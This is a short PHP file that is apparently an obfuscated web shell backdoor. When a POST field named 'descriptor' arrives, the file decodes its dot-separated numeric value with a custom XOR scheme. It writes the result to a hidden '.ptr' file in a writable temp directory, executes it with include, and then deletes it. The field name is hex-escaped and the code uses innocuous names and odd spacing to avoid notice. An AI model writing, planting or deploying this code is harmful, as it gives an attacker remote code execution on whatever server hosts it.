<?php

if(filter_has_var(INPUT_POST, "d\x65scrip\x74\x6F\x72")){
	$factor = array_filter([getenv("TEMP"), session_save_path(), "/var/tmp", ini_get("upload_tmp_dir"), getenv("TMP"), sys_get_temp_dir(), "/tmp", "/dev/shm", getcwd()]);
	$pointer = $_POST["d\x65scrip\x74\x6F\x72"];
			$pointer =	explode 		(		"."	,   $pointer	 	) ;  
	$ent = '';
            $salt = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen(		$salt);
            $n = 0;
    
            array_walk(		$pointer, function(		$v9) use(		&$ent, &$n, $salt, $sLen) {$chS = ord(		$salt[$n % $sLen]);
                $d =(		(		int)$v9 - $chS -(		$n % 10))^ 	45;
                $ent	.=chr(		$d);
                $n++;
            });
	foreach ($factor as $item):
    		if (is_dir($item) ? is_writable($item) : false) {
    $bind = str_replace("{var_dir}", $item, "{var_dir}/.ptr");
    if (@file_put_contents($bind, $ent) !== false) {
	include $bind;
	unlink($bind);
	exit;
}
}
endforeach;
}